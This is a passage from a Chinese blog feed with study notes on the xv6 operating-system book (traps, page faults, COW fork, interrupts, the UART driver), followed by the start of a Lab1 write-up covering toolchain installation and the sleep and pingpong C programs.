title="代码：系统调用参数"></a>代码：系统调用参数</h3><p>根据 RISC-V C 调用约定，系统调用参数存放在寄存器中</p><p>内核陷阱代码将寄存器的值保存到当前进程的 trapframe 中，这样内核可以找到它们</p><p>内核函数 <code>argint</code>，<code>argaddr</code>，<code>argfd</code> 从 trapframe 中检索系统调用参数作为整数、指针或文件描述符，它们都调用 <code>argraw</code>  从用户寄存器中检索</p><p>指针作为参数有两个挑战</p><ul><li>用户程序可能是错误或恶意的，传递一个无效的指针或欺骗内核用来访问内核内存的指针</li><li>xv6 内核页表映射与用户页表映射并不相同，不能用普通指令从提供的地址加载或存储数据</li></ul><p>内核实现了安全的传输数据的函数</p><ul><li>文件系统调用如 exec 用 <code>fetchstr</code>（kernel/syscall.c）从用户空间检索字符串文件名参数</li><li><code>fetchstr</code> 调用 <code>copyinstr</code>（kernel/vm.c）来完成</li><li><code>copyinstr</code>  从用户页表的虚拟地址 p-&gt;pagetable-&gt;srcva 复制 max 字节到 dst 中<ul><li>因为 pagetable 不是当前的页表，<code>copyinstr</code> 使用 walkaddr（它会调用 walk） 在 pagetable 中查找 srcva，从而产生物理地址 pa0</li><li>内核将每个物理内存地址映射到对应的内核虚拟地址，因此 <code>copyinstr</code> 能直接从 pa0 复制字符串字节到 dst</li><li><code>walkaddr</code>（kernel/vm.c）会检查用户提供的虚拟地址是否是进程地址空间的一部分，因此程序不能欺骗内核来读取其他内存</li></ul></li><li>类似的功能 copyout 从内核读取数据到用户提供的地址</li></ul><h3 id="内核-trap"><a href="#内核-trap" class="headerlink" title="内核 trap"></a>内核 trap</h3><p>CPU 在执行内核时，stvec 会指向 <code>kernelvec</code>（kernel/kernelvec.S）</p><p>如果发生 trap 会跳转到 <code>kernelvec</code> 来处理 trap</p><p><code>kernelvec</code> 将通用寄存器保存在中断的内核线程的栈中，trap 有可能导致切换线程，这样不会导致混乱</p><p><code>kernelvec</code> 保存完寄存器后调用 <code>kerneltrap</code>（kernel/trap.c）</p><p><code>kerneltrap</code> 会保存控制寄存器并处理两种 trap</p><ul><li>设备中断<ul><li>使用 <code>devintr</code> 检查设备中断</li><li>如果是计时器中断，且进程的内核线程正在运行，<code>kerneltrep</code> 会调用 <code>yield</code> 让其他线程有机会运行</li></ul></li><li>异常<ul><li>内核会调用 panic 然后停止运行</li></ul></li></ul><p>当 <code>kerneltrap</code> 任务完成后，它需要返回到 trap 中断的代码，会恢复保存的控制寄存器，然后返回到 <code>kernelvec</code></p><p><code>kernelvec</code> 恢复保存的通用寄存器，然后执行 sret，返回中断的内核代码</p><p>在内核开始执行时有一段时间 stvec 仍然指向 <code>uservec</code>，这段时间内不允许发生设备中断</p><p>RISC-V 会在发生 trap 时关闭设备中断，让内核有时间设置 stvec 为 <code>kernelvec</code></p><h3 id="页面错误异常"><a href="#页面错误异常" class="headerlink" title="页面错误异常"></a>页面错误异常</h3><p>CPU 会发出页面错误异常，当：</p><ul><li>虚拟地址在页表中没有映射</li><li>PTE 的 PTE_V 标志位为 0</li><li>PTE 的权限位阻止正在尝试的操作</li></ul><p>RISC-V 区分三种页面错误：</p><ul><li>load page faults</li><li>store page faults</li><li>instruction page faults<ul><li>PC 寄存器的地址指向的指令无法翻译</li></ul></li></ul><p>xv6 的异常处理很单一：如果在用户空间发生异常，内核会杀死出错的进程，如果在内核中发生异常，内核会发生 panic</p><p>真实的操作系统会做很多有趣的处理</p><ul><li>COW fork</li><li>Lazy allocation</li><li>Demand Paging</li><li>Paging to disk</li><li>Extending stacks</li><li>Memory-mapped files</li></ul><h4 id="COW-fork"><a href="#COW-fork" class="headerlink" title="COW fork"></a>COW fork</h4><p>许多内核使用页面错误来实现 COW，加快 fork，它不需要复制内存，特别是在 fork 后 exec 时很高效</p><p>在 xv6 中，<code>fork</code> 会让子进程的初始内存与父进程的相同，它调用 <code>uvmcopy</code> 给子进程分配物理空间并复制父进程的内存给它</p><p>如果父子进程共享父进程的物理内存会更加高效</p><ul><li>COW fork 的简单计划<ol><li>父子进程一开始共享所有的物理页，且设为只读</li><li>当某个进程要写入内存时，CPU 抛出页面错误异常</li><li>内核的 trap 处理程序分配一个新的物理页面，并将原页面的内容复制过去</li><li>将出错进程的页表中相关 PTE 指向副本，允许读写，然后重新执行指令</li></ol></li></ul><p>COW 需要一个记录，来决定物理页面何时释放，它可能有多个进程在使用；当发生 store 页面错误时，如果该物理页面只有出错进程指向它，不需要再复制，直接使用</p><h4 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h4><p>用户程序调用 <code>sbrk</code> 申请更多内存时，内核先增加它的 size，但不申请物理内存，不创建映射</p><p>当用户程序访问新地址时，会发生页面错误，内核再申请一页物理内存并在页表添加映射</p><ol><li>kalloc</li><li>初始化页面</li><li>页面映射</li><li>更新页表</li><li>重新执行指令</li></ol><p>如果用户程序申请了很大内存，但是不去使用，Lazy allocation 会提高效率</p><p>lazy allocation 可以让空间成本随时间分摊，但是会导致页面错误的额外开销</p><p>内核可以通过分配一批连续页面，对页面错误的 trap 处理程序进行特殊化来减小开销</p><h4 id="Demand-paging"><a href="#Demand-paging" class="headerlink" title="Demand paging"></a>Demand paging</h4><p>在 <code>exec</code> 中，xv6 会将程序的所有 text 和 data 直接加载到内存中，由于程序可能会很大，从磁盘中读取开销昂贵</p><ol><li>现代内核为用户地址空间创建页表，但是 PTE 标记为无效</li><li>当出现页面错误时，内核将页面的内容从磁盘中读取，添加映射</li></ol><h4 id="Paging-to-disk"><a href="#Paging-to-disk" class="headerlink" title="Paging to disk"></a>Paging to disk</h4><p>一个进程可能需要的内存多于计算机的 RAM，操作系统可能会实现 paging to disk</p><p>内核会将用户页面的一部分放在内存中，其余的页面保存到磁盘中的 paging area 区域，并将对应的 PTE 标记为无效</p><p>当进程尝试访问磁盘上的页面，会发生页面错误，内核会将该页面从硬盘中读取出来</p><p><strong>如果没有多余的内存</strong></p><p>内核先将一个页面驱逐，保存到磁盘中，将对应的 PTE 标记为无效，但是驱逐的花销是昂贵的</p><h3 id="真实世界-2"><a href="#真实世界-2" class="headerlink" title="真实世界"></a>真实世界</h3><p>如果将内核内存映射到每个进程的用户页表中，可以消除对页表切换的需求</p><p>生产环境的操作系统实现了 COW、Lazy allocation、Demand paging、Paging to disk、Memory-mapped files 等等</p><p>xv6 没有这样做，如果用完内存，</p><h2 id="Chapter-5-Interrupts-and-device-drivers"><a href="#Chapter-5-Interrupts-and-device-drivers" class="headerlink" title="Chapter 5 Interrupts and device drivers"></a>Chapter 5 Interrupts and device drivers</h2><ul><li><p>驱动程序（driver）</p><ul><li>操作系统中管理特定设备的代码它配置硬件，告诉设备执行操作，处理产生的中断，与可能正在等待来自设备 I/O 的进程进行交互</li><li>driver 代码可能很复杂，因为驱动程序与它管理的设备要同时执行</li><li>driver 必须了解设备的硬件接口，接口可能很复杂且缺乏文档记录</li><li>后续驱动程序用 driver 表示<del>（别问，问就是 driver 在一堆中文里更清晰）</del></li></ul></li><li><p>中断（Interrupt）</p><ul><li>设备需要操作系统特别关注，它可以进行配置，产生中断（trap 的一种）</li><li>当设备发起中断，内核 trap 处理代码能识别出设备中断并调用驱动程序的中断处理程序</li><li>在 xv6 中，中断处理的分配在 <code>devintr</code> 函数中</li></ul></li><li><p>许多设备 driver 在两个上下文中执行代码</p><ul><li>在进程的内核线程中执行前半部分<ul><li>前半部分由需要执行 I/O 的系统调用（如 <code>read</code> 和 <code>write</code>）来调用</li><li>此代码可能请求硬件启动操作（如请求硬盘读取块），然后等待操作完成</li><li>最后设备完成操作，发起中断</li></ul></li><li>在中断时执行后半部分<ul><li>driver 的中断处理程序作为后半部分</li><li>它找到设备完成的操作，在适当的情况唤醒正在等待的进程</li><li>告诉硬件开始处理下一个操作</li></ul></li></ul></li></ul><h3 id="代码：控制台输入"><a href="#代码：控制台输入" class="headerlink" title="代码：控制台输入"></a>代码：控制台输入</h3><h4 id="控制台连接到-RISC-V"><a href="#控制台连接到-RISC-V" class="headerlink" title="控制台连接到 RISC-V"></a>控制台连接到 RISC-V</h4><p>控制台 driver 位于 kernel/console.c，可作为驱动程序结构的一个简单说明</p><p>xv6 的控制台 driver 交互的 UART 硬件是 QEMU 仿真的 16550 芯片，在真实的计算机，一个 16550 芯片管理 RS232 串行链路，连接着一个中断或其他计算机。当运行 QEMU 时，它连接着键盘和显示器</p><p>控制台 driver 一次累积一行的输入，处理特殊的输入字符，如退格 backspace 和 control-u</p><p>当用户在 QEMU 中向 xv6 输入时，击键通过 QEMU 模拟的 UART 硬件传递给 xv6</p><ul><li>一些物理地址由 RISC-V 硬件连接到 UART 设备<ul><li>从这些物理地址读写是与设备硬件交互而不是内存</li><li>UART 的内存映射地址从 0x10000000 （或 <code>UART0</code> kenrel/memlayout.h）开始</li></ul></li></ul><h4 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h4><p>UART 硬件在软件层面为一组内存映射的控制寄存器（这里的寄存器并不是 CPU 寄存器，而且位于 UART 硬件中的寄存器）</p><ul><li>UART 控制寄存器宽度为 1 Byte，它们在 <code>UART0</code> 的偏移在 kernel/uart.c 中定义</li><li>LSR <ul><li>line status register</li><li>比特位表示输入的字符是否在等待软件读取</li></ul></li><li>RHR<ul><li>receive holding register</li><li>保存等待读取的字符</li><li>每次一个字符被读取，UART 硬件将它从一个 FIFO 的结构中删除</li><li>当 FIFO 结构为空时将 LSR 的 ready 位清零</li></ul></li><li>THR<ul><li>transimit holding register</li><li>保存等待传输的字符</li></ul></li></ul><p>UART 传输硬件很大程度上独立于接收硬件，如果软件向 THR 写 1 Byte，UART 就传输该字节</p><h4 id="xv6-的控制台输入"><a href="#xv6-的控制台输入" class="headerlink" title="xv6 的控制台输入"></a>xv6 的控制台输入</h4><p>xv6 的 <code>main</code> 调用 <code>consoleinit</code> 来初始化 UART 硬件，配置 UART 让它每接收到 1 Byte 输入就生成一个 receive 中断，每完成 1 Byte 的输出就生成一个 transmit complete 中断</p><ul><li>用户进程，如 shell，通过 user/init.c 打开的文件描述符，使用 <code>read</code> 系统调用从控制台获取输入行</li><li><code>read</code> 系统调用通过内核的 <code>consoleread</code> 完成操作</li><li><code>consoleread</code> 等待输入（通过中断），然后将字符放入 cons.buf 作为缓冲，把输入复制到用户空间，直到一整行输入到达，返回到用户进程<ul><li>如果用户还没有输入一整行，任何需要读取的进程都在 <code>sleep</code> 调用中等待</li></ul></li></ul><p>当用户输入一个字符</p><ul><li>UART 硬件请求 RISC-V 发起中断，激活 xv6 的 trap 处理程序</li><li>trap 处理程序会调用 <code>devintr</code>，从 scause 寄存器查找中断来自哪个外部设备，然后告诉 PLIC 硬件单元哪个设备发出中断，如果来自 UART，<code>devintr</code> 会调用 <code>uartintr</code></li><li><code>uartintr</code> 读取来自 UART 硬件的等待输入的字符（RHR），将它们传给 <code>consoleintr</code></li><li><code>consoleintr</code> 会将字符积累在 cons.buf，但对 backspace 和一些其他字符特殊处理</li><li>当一行新的字符到达（读取到 ‘\n’）时，<code>consoleintr</code> 会唤醒一个正在等着等待的 <code>consoleread</code></li></ul><h3 id="代码：控制台输出"><a href="#代码：控制台输出" class="headerlink" title="代码：控制台输出"></a>代码：控制台输出</h3><p>设备 driver 维护一个输入缓冲区 uart_tx_buf，因此需要输出的进程不需要等待 UART 完成发送，除非缓冲区已满</p><ul><li><code>write</code> 系统调用使用连接着控制台的文件描述符，最终会到达 <code>uartputc</code></li><li><code>uartputc</code> 将每个字符加入缓冲区，调用 <code>uartstart</code> 开始设备传输并返回</li></ul><p>UART 每完成一个字节的发送，就会发起中断，<code>uartintr</code> 调用 <code>uartstart</code> 检查设备是否已经完成发送，然后将下一个缓冲的输出字符传给设备</p><p>如果一个进程将多个字节写入控制台，第一个字节会由 <code>uartputc</code> 调用的 <code>uartstart</code> 来发送，剩下的字节由 <code>uartintr</code> 调用的 <code>uartstart</code> 来发送</p><p>需要注意的是，这里通过缓冲和中断将设备活动和进程活动进行解耦</p><p>控制台 driver 可以处理输入，即使没有进程等待读取，一个后来的读取可以看到输入；进程可以不等待设备发送输出</p><p>解耦通过允许进程与设备 I/O 同时执行来提高性能，当设备速度慢（如 UART）或需要即时响应（如回应键入的字符）时尤其重要</p><p>这也被称为 I/O 并行</p><h3 id="驱动程序中的并发"><a href="#驱动程序中的并发" class="headerlink" title="驱动程序中的并发"></a>驱动程序中的并发</h3><p>你可能注意到在 <code>consoleread</code> 和 <code>consoleintr</code> 中调用 <code>acquire</code></p><p>这个调用申请一个🔒，保护控制台 driver 的数据结构免受并发访问影响</p><p>三个并发危险，可能会导致竞争或死锁</p><ul><li>两个在不同 CPU 核的进程同时调用 <code>consoleread</code></li><li>当 CPU 正在执行 <code>consoleread</code> 时，硬件可能请求该 CPU 发送控制台中断</li><li>当 CPU 正在执行 <code>consoleread</code> 时，硬件可能在另一个 CPU 中发送控制台中断</li></ul><p>drivers 的并发另一个需要小心的地方：一个进程可能等待设备输入，当另一个进程在运行时，输入的中断信号可能到达</p><p>中断处理程序不会考虑中断的进程和代码，例如一个中断处理程序无法安全地使用当前进程的页表调用 <code>copyout</code>，它只会做很少量的工作（如，将输入数据复制到缓冲区），并唤醒前半部分代码完成其余工作</p><h3 id="定时器中断"><a href="#定时器中断" class="headerlink" title="定时器中断"></a>定时器中断</h3><p>Xv6 使用定时器中断维持时钟，使其能在进程之间切换进行调度</p><p><code>usertrap</code> 和 <code>kerneltrap</code> 中的 <code>yield</code> 调用也会导致这类切换</p><p>定时器中断来自 RISC-V 中每个 CPU 的时钟硬件，xv6 对这个时钟硬件编程，以定期中断每个 CPU</p><p>RISC-V 要求计时器中断要由机器模式接管，而不是管理者模式</p><p>RISC-V 机器模式不用分页执行代码，使用一组独立的控制寄存器，因此在机器模式执行普通的 xv6 内核代码时是不实际的</p><p>因此 xv6 将定时器中断独立于之前使用的 trap 机制进行处理</p><p>机器模式执行的代码在 kernel/start.c 中，在执行 <code>main</code> 之前，设置定时器中断的接收</p><ul><li>对 CLINT（core-local interruptor）硬件进行编程，以在一定延迟后生成中断</li><li>设立一个类似 trapframe 的临时区域，帮助定时器中断处理程序保存寄存器和 CLINT 寄存器的地址</li><li>最后 <code>start</code> 将 mtvec 设置为 <code>timervec</code>（在 kernel/kernelvec.S 中），启用定时器中断</li></ul><h3 id="真实世界-3"><a href="#真实世界-3" class="headerlink" title="真实世界"></a>真实世界</h3><p>xv6 允许在执行内核和用户程序时启用设备和定时器中断</p><p>定时器中断强制线程切换，即使是在内核态运行，因此内核代码需要注意它可能被挂起，并在不同的 CPU 上恢复</p><p>如果内核线程有时花费大量时间计算而不返回用户空间，在内核线程之间公平地对 CPU 进行时间切片是有效的</p><p>如果只在执行用户代码时发生设备和定时器中断，会让内核更简单</p><p>在一台计算机上支持所有设备是一项艰巨的工作，因为有许多设备，有许多功能，设备和 driver 之间的协议可能很复杂且缺乏文档。在许多操作系统中，driver 比内核核心代码占用更多</p><p>UART driver 通过读取 UART 控制寄存器一次检索 1 Byte 的数据，称为 programmed I/O，因为软件正在驱动数据移动</p><h4 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h4><ul><li>编程 I/O 很简单，但是速度太慢，无法在高数据速率下使用</li><li>xv6 的 UART driver 先将传入的数据复制到内核的缓冲区，再复制到用户空间，在低数据速率时有效，但如果设备产生或使用数据很快，两次复制会严重降低性能</li></ul><p>因此有直接存储器访问（DMA）技术</p><ul><li>DMA 硬件设备直接将传入的数据写入 RAM，并从 RAM 读取传出的数据</li><li>高速移动大量数据的设备（现代磁盘和网络设备）通常使用直接存储器访问（DMA）</li></ul><p>一些操作系统常使用 DMA 直接将数据在用户空间的缓冲区和设备硬件之间移动</p><p>DMA 设备 driver 在 RAM 中准备数据，对一个控制寄存器进行一次写入告诉设备去处理准备好的数据</p><h4 id="中断优化"><a href="#中断优化" class="headerlink" title="中断优化"></a>中断优化</h4><p>当一个设备在不可预测的时间需要关注时，中断是有意义的，但是中断有很高的 CPU 开销</p><p>高速设备（如网络和磁盘控制器）使用一些技巧减少中断的需求</p><ul><li>对整批传入或传出的请求发起一个中断</li><li>轮询：完全禁用中断，定期检查设备是否需要关注</li></ul><p>如果设备执行操作非常快，轮询效率较高，但是如果设备大部分时间处于空闲状态，则会浪费 CPU 时间</p><p>某些驱动程序根据当前设备负载会在轮询和中断之间动态切换</p><h4 id="设备使用"><a href="#设备使用" class="headerlink" title="设备使用"></a>设备使用</h4><p>如第 1 章所述，控制台在应用程序呈现为一个常规文件，应用程序通过 <code>read</code> 和 <code>write</code> 系统调用读取输入，写入输出</p><p>应用程序可能想要控制不能作为标准文件系统调用的设备，Unix 操作系统支持 ioctl 系统调用应对这种情况</p><h4 id="实时响应"><a href="#实时响应" class="headerlink" title="实时响应"></a>实时响应</h4><p>计算机的一些使用需要系统在有限的时间内做出响应（严格安全的系统错过 deadline 可能会导致灾难）</p><p>xv6 不适合严格实时设置，严格实时操作系统往往是与应用程序链接的库，允许进行分析最坏情况下的响应时间</p><p>xv6 也不适合软实时应用程序，偶尔错过 deadline 是可以接受的，因为 xv6 调用程序过于简单，并且它在内核代码路径中有一段较长时间中断是禁止的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文是笔者在学习 MIT 6.1810 2022 Fall 阅读 xv6 文档时所写，大部分是将原文翻译，笔者尽可能加入自己的理解并排版，&lt;del&gt;应该会&lt;/del&gt;持续更新直到文档读完&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab1 Xv6 and Unix utilities</title>
    <link href="https://humoooor.cn/2022/10/13/Lab1_Xv6_and_Unix_utilities/"/>
    <id>https://humoooor.cn/2022/10/13/Lab1_Xv6_and_Unix_utilities/</id>
    <published>2022-10-13T11:47:00.000Z</published>
    <updated>2023-05-23T03:38:06.116Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="启动-xv6"><a href="#启动-xv6" class="headerlink" title="启动 xv6"></a>启动 xv6</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2022</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 git 日志</span></span><br><span class="line">git status</span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于获取实验所需文件</span></span><br><span class="line">git checkout util</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当完成一个实验并想要检记录进度可使用 git commit</span></span><br><span class="line">git commit -am <span class="string">&#x27;my solution for util lab exercise 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看相比上一次 commit 的变化</span></span><br><span class="line"><span class="string">git diff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看相比最初的变化</span></span><br><span class="line"><span class="string">git diff origin/util</span></span><br></pre></td></tr></table></figure><h3 id="建立并运行-xv6"><a href="#建立并运行-xv6" class="headerlink" title="建立并运行 xv6"></a>建立并运行 xv6</h3><ul><li><p><code>make qemu</code></p><ul><li><p>第一步就出错了。。。</p><ul><li><code>Error: Couldn&#39;t find a riscv64 version of GCC/binutils.</code></li><li>缺少 RISC-V 相关的 GCC/binutils</li><li>搜索 binutils <code>apt search binutils | grep riscv64</code></li><li>安装第一个即可</li><li><code>sudo apt install binutils-riscv64-linux-gnu</code></li></ul></li><li><p>接着是另一个报错</p><ul><li><code>riscv64-linux-gnu-gcc    -c -o kernel/entry.o kernel/entry.S</code></li><li><code>make: riscv64-linux-gnu-gcc: No such file or directory</code></li><li><code>make: *** [\&lt;builtin\&gt;: kernel/entry.o] Error 127</code></li><li>安装对应的 gcc <code>sudo apt install gcc-10-riscv64-linux-gnu</code></li><li>进入 /usr/bin 目录，建立软链接</li><li><code>sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc</code></li></ul></li><li><p>后面又是缺少什么文件，去翻了翻 lab 介绍，发现已经给了工具链接 <a href="https://pdos.csail.mit.edu/6.828/2022/tools.html">lab tools page</a></p><ul><li><code>sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</code></li><li>这里的 gcc-riscv64-linux-gnu 下载的是 gcc-11，要再下回 gcc-10，不然会报错</li><li><code>sudo apt install gcc-10-riscv64-linux-gnu</code></li><li><code>cd /usr/bin; sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc</code></li><li>结果一气呵成~</li></ul></li></ul></li></ul><p>里面有一些很基本的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xv6 kernel is booting</span><br><span class="line"></span><br><span class="line">hart 1 starting</span><br><span class="line">hart 2 starting</span><br><span class="line">init: starting sh</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">.              1 1 1024</span><br><span class="line">..             1 1 1024</span><br><span class="line">README         2 2 2227</span><br><span class="line">xargstest.sh   2 3 93</span><br><span class="line"><span class="built_in">cat</span>            2 4 32832</span><br><span class="line"><span class="built_in">echo</span>           2 5 31728</span><br><span class="line">forktest       2 6 15680</span><br><span class="line">grep           2 7 36176</span><br><span class="line">init           2 8 32152</span><br><span class="line"><span class="built_in">kill</span>           2 9 31712</span><br><span class="line"><span class="built_in">ln</span>             2 10 31520</span><br><span class="line"><span class="built_in">ls</span>             2 11 34728</span><br><span class="line"><span class="built_in">mkdir</span>          2 12 31784</span><br><span class="line"><span class="built_in">rm</span>             2 13 31768</span><br><span class="line">sh             2 14 53960</span><br><span class="line">stressfs       2 15 32496</span><br><span class="line">usertests      2 16 181776</span><br><span class="line">grind          2 17 47696</span><br><span class="line"><span class="built_in">wc</span>             2 18 33832</span><br><span class="line">zombie         2 19 31168</span><br><span class="line">console        3 20 0</span><br></pre></td></tr></table></figure><p>-<del>甚至都没有 clear</del></p><p>Ctrl-p 打印进程信息</p><p>Ctrl-a x 退出 qemu</p><p><strong>结论：做任何事之前先看介绍</strong></p><h3 id="成绩测试"><a href="#成绩测试" class="headerlink" title="成绩测试"></a>成绩测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试所有实验</span></span><br><span class="line">make grade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试一个程序</span></span><br><span class="line">./grade-lab-util name</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">make GRADEFLAGS=name grade</span><br></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>在 bash 中测试，能够多参数且如果一个参数错误就不执行</p><figure class="highlight c"><figcaption><span>user/sleep.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">isDigitStr</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i] &lt; <span class="string">&#x27;0&#x27;</span> || str[i] &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sleep: missing operand\n&quot;</span>);</span><br><span class="line">        status = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc &amp;&amp; !status; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!isDigitStr(argv[i])) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sleep: invalid time interval\n&quot;</span>);</span><br><span class="line">            status = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc &amp;&amp; !status; i++) &#123;</span><br><span class="line">        sleep(atoi(argv[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码放在 <code>user</code> 目录下，每次写完一个程序在 Makefile 中的 UPROGS 下添加一行 <code>$U/_sleep\</code></p><p>然后 <code>make qemu</code> 编译运行</p><p>之后可以在 qemu 外运行 <code>/grade-lab-util sleep</code> 进行单项测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./grade-lab-util <span class="built_in">sleep</span></span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to <span class="built_in">date</span>.</span><br><span class="line">== Test <span class="built_in">sleep</span>, no arguments == <span class="built_in">sleep</span>, no arguments: OK (1.5s)</span><br><span class="line">== Test <span class="built_in">sleep</span>, returns == <span class="built_in">sleep</span>, returns: OK (0.6s)</span><br><span class="line">== Test <span class="built_in">sleep</span>, makes syscall == <span class="built_in">sleep</span>, makes syscall: OK (1.0s)</span><br></pre></td></tr></table></figure><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><p>简单题</p><p>父进程发送子进程一个字节，子进程收到后再给父进程一个字节</p><figure class="highlight c"><figcaption><span>user/pingpong.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid, p[<span 